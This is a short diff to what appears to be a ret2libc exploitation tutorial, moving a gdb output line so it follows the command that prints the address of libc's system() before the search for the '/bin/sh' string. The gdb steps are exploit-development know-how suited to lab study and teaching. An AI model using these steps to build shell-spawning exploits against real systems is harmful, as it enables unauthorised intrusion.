@@ -14,12 +14,12 @@ Get address of `system`:
 
 ```bash
 (gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ```
 
 Get address of `/bin/sh`:
 
 ```bash
-$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 (gdb) find __libc_start_main,+99999999,"/bin/sh"
 0xb7f8cc58
 (gdb) x/s 0xb7f8cc58
